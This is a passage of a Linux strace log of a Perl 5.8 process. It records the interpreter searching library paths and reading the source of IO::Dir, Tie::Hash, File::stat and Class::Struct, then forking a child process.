my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
9764  07:29:45.430235 stat64("/etc/perl/Tie/Hash.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.430253 stat64("/etc/perl/Tie/Hash.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.430266 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.430294 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.430335 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.430365 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.430379 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.430390 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.430403 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.430415 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.430428 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.430441 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.430454 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.430467 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
9764  07:29:45.430488 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
9764  07:29:45.430503 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa2d68) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.430514 _llseek(8, 0, [0], SEEK_CUR) = 0
9764  07:29:45.430533 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
9764  07:29:45.430895 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
9764  07:29:45.431495 read(8, "", 4096) = 0
9764  07:29:45.431512 close(8)          = 0
9764  07:29:45.431543 stat64("/etc/perl/File/stat.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.431558 stat64("/etc/perl/File/stat.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.431572 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.431585 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.431599 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.431611 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.431625 stat64("/usr/lib/perl5/File/stat.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.431637 stat64("/usr/lib/perl5/File/stat.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.431650 stat64("/usr/share/perl5/File/stat.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.431662 stat64("/usr/share/perl5/File/stat.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.431676 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.431688 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.431706 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.431719 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
9764  07:29:45.431741 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
9764  07:29:45.431755 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa2d68) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.431780 _llseek(8, 0, [0], SEEK_CUR) = 0
9764  07:29:45.431828 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
9764  07:29:45.432256 stat64("/etc/perl/Class/Struct.pmc", 0xbffa2b9c) = -1 ENOENT (No such file or directory)
9764  07:29:45.432308 stat64("/etc/perl/Class/Struct.pm", 0xbffa2aac) = -1 ENOENT (No such file or directory)
9764  07:29:45.432322 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbffa2b9c) = -1 ENOENT (No such file or directory)
9764  07:29:45.432352 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbffa2aac) = -1 ENOENT (No such file or directory)
9764  07:29:45.432366 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbffa2b9c) = -1 ENOENT (No such file or directory)
9764  07:29:45.432379 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbffa2aac) = -1 ENOENT (No such file or directory)
9764  07:29:45.432394 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbffa2b9c) = -1 ENOENT (No such file or directory)
9764  07:29:45.432405 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbffa2aac) = -1 ENOENT (No such file or directory)
9764  07:29:45.432419 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbffa2b9c) = -1 ENOENT (No such file or directory)
9764  07:29:45.432431 stat64("/usr/share/perl5/Class/Struct.pm", 0xbffa2aac) = -1 ENOENT (No such file or directory)
9764  07:29:45.432445 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbffa2b9c) = -1 ENOENT (No such file or directory)
9764  07:29:45.432457 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbffa2aac) = -1 ENOENT (No such file or directory)
9764  07:29:45.432473 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbffa2b9c) = -1 ENOENT (No such file or directory)
9764  07:29:45.432487 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
9764  07:29:45.432508 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
9764  07:29:45.432542 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa28b8) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.432554 _llseek(10, 0, [0], SEEK_CUR) = 0
9764  07:29:45.432574 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
9764  07:29:45.433189 brk(0x82de000)    = 0x82de000
9764  07:29:45.433592 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
9764  07:29:45.434213 _llseek(10, 6916, [6916], SEEK_SET) = 0
9764  07:29:45.434230 _llseek(10, 0, [6916], SEEK_CUR) = 0
9764  07:29:45.434241 close(10)         = 0
9764  07:29:45.434472 _llseek(8, 1334, [1334], SEEK_SET) = 0
9764  07:29:45.434489 _llseek(8, 0, [1334], SEEK_CUR) = 0
9764  07:29:45.434500 close(8)          = 0
9764  07:29:45.435122 brk(0x82ff000)    = 0x82ff000
9764  07:29:45.435308 _llseek(6, 2689, [2689], SEEK_SET) = 0
9764  07:29:45.435342 _llseek(6, 0, [2689], SEEK_CUR) = 0
9764  07:29:45.435353 close(6)          = 0
9764  07:29:45.435504 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7dcc908) = 9765
9765  07:29:45.435612 getppid()         = 9764
9765  07:29:45.436091 open("/etc/nsswitch.conf", O_RDONLY) = 6
9765  07:29:45.436114 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
9765  07:29:45.436133 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f92000
